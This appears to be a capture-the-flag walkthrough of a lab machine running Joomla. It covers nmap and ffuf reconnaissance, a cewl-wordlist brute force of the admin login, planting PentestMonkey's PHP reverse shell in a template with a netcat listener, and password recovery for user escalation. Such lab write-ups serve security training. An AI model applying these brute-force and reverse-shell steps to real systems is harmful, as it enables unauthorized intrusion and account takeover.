## IP : 192.168.190.79

# RECONNAISSANCE

**Nmap** scan (SYN, service/version, default scripts):
```bash
sudo nmap -p- -sS -sC -sV --open 192.168.190.79
```
```
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
```

**HTTP** (port 80)  
- Default page, no title.  
- **Directory fuzzing** with FFUF:
  ```bash
  ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        -u http://192.168.190.79/FUZZ
  ```
  Found `/joomla/`.  
- Further fuzz under `/joomla/`:
  ```bash
  ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt        -u http://192.168.190.79/joomla/FUZZ
  ```
  Found many (including `administrator`).

# VULNERABILITY & BRUTE-FORCE

Since we don’t know credentials, generate a custom wordlist from the admin page:

```bash
cewl http://192.168.190.79/joomla/administrator/ -d 4 -m 5 -w cewl2.txt
```

Inspect `cewl2.txt`:
```bash
cat cewl2.txt | grep "" -b
# Lists words like Joomla, Username, Password, Arthur, Gotham, etc.
```

Use **Burp Suite Intruder (Pitchfork mode)**:
- Capture the POST to `/joomla/administrator/index.php`.  
- Position both `username` and `passwd` parameters.  
- Load `cewl2.txt` as payload set for both fields.  
- Run attack → **Joomla:Gotham** succeeds.


# INITIAL ACCESS

Login at `http://192.168.190.79/joomla/administrator/` with **Joomla:Gotham**.  
Browse to `joomla/templates/protostar/index.php` via the GUI editor.  
Replace its contents with PentestMonkey’s PHP reverse shell (update LHOST/LPORT), save.

```bash
nc -lvnp 4444
# Then refresh http://192.168.190.79/joomla/index.php
```
You’ll receive a shell as **www-data**.

**User flag:**
```bash
cat /home/www-data/user.txt
# flag{...}
```

# PRIVILEGE ESCALATION

- **Configuration**: `/var/www/html/joomla/configuration.php` holds DB creds.
- **Journal clue** in `/home/www-data/journal.txt`:  
  A ROT1 + Base64 string yields password for `rob`:  
  ```
  ???AllIHaveAreNegativeThoughts???
  ```
- `su rob` 
- In `rob`’s home find a zipped archive requiring Abner’s password.  
- Use the earlier enigma to derive **Abner**’s pass:  
  ```
  I33hn0e94my0death000makes49mn2e8cem9s00than0my0life0
  ```
- `su abner` → get **abner** shell.

**Root flag** in `/home/abner/root.txt`.
